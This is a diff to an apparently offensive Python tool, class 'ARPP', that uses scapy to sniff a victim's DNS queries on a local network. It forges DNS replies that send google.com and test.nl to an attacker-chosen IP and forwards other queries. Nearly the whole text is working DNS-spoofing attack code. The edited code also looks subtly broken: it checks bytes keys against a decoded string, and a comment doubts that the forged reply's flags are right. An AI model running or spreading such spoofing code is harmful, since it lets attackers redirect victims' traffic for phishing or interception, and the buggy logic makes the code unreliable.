@@ -451,8 +451,8 @@ class ARPP(object):
             ipVictim (str, optional): The IP of the victim that you want to DNS spoof. Defaults to "".
         """
         # a dictionary of sites that if the victim tries to access them they are directed to the wrong IP address
-        target_sites = {"google.com.":"192.168.178.217",\
-            "test.nl":"192.168.178.217"}
+        target_sites = {b"google.com.":"192.168.178.217",\
+            b"test.nl":"192.168.178.217"}
         loc_dns = "127.0.0.1" # corresponding to iptable ip address that packet is routed to
         
         # this function is called on each packet in the sniff call further ahead
@@ -485,27 +485,29 @@ class ARPP(object):
                 #         and (DNSQR in packet)\
                 #         and ( any([target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()]) ):
                 if (DNS in packet\
+                    and DNSQR in packet\
                     and packet[DNS].opcode == 0\
                     and packet[DNS].ancount == 0):
                     # the previous if-statement checks if it's a DNS request and it's coming from the victim and it's a QUERY (i.e. opcode=0), if so then send fake reply
-                    print("[+] Caught DNS request from {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
-                    
-                    # we read the site the victim is trying to access and map the site to the spoofed IP given by our target_sites dictionary 
-                    index_of_target_site = [target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()].index(1)
-                    fake_ip = list(target_sites.values())[index_of_target_site]
-                    
-                    # create a fake DNS reply packet
-                    #!!!#!!!#!!!#     maybe it is missing the right flags for it to be meaningful to the victim device
-                    fake_DNS_reply = IP(dst=packet[IP].src, src=packet[IP].dst)\
-                        /UDP(dport=packet[UDP].sport, sport=53)\
-                        /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip))\
-                        /DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip)
-                    
-                    # send the fake packet on the selected interface
-                    send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
-                    print("[+] Sent fake DNS reply to {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
-                else:
-                    forward_dns(packet)
+                    if packet[DNSQR].qname in list(target_sites.keys()):
+                        print("[+] Caught DNS request from {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
+                        
+                        # we read the site the victim is trying to access and map the site to the spoofed IP given by our target_sites dictionary 
+                        index_of_target_site = [target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()].index(1)
+                        fake_ip = list(target_sites.values())[index_of_target_site]
+                        
+                        # create a fake DNS reply packet
+                        #!!!#!!!#!!!#     maybe it is missing the right flags for it to be meaningful to the victim device
+                        fake_DNS_reply = IP(dst=packet[IP].src, src=packet[IP].dst)\
+                            /UDP(dport=packet[UDP].sport, sport=53)\
+                            /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip))\
+                            /DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip)
+                        
+                        # send the fake packet on the selected interface
+                        send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
+                        print("[+] Sent fake DNS reply to {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
+                    else:
+                        forward_dns(packet)
             
             return send_spoofed_response
                         
